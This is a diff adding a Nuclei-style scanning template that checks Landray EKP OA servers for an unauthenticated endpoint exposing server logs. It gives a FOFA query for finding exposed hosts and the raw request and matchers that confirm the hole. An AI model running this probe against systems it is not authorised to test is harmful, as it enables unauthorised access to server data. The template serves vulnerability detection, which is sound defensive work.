@@ -1,0 +1,26 @@
+id: Lanlin-EKP-behavior-unauth
+
+info:
+  name: Lanlin EKP system Unauthorized Access Vulnerability(蓝凌EKP系统存在未授权访问漏洞)
+  author: linfeng7z
+  severity: high
+  tags: lanlin,ekp,unauth
+  metadata:
+    fofa-query: 'app="Landray-OA系统"'
+
+http:
+  - raw:
+      - |
+        @timeout: 10
+        POST /./ui-ext/./behavior/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
+        follow_redirects: false
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "ekp_server.log")'
+          - "status_code == 200"
+        condition: and
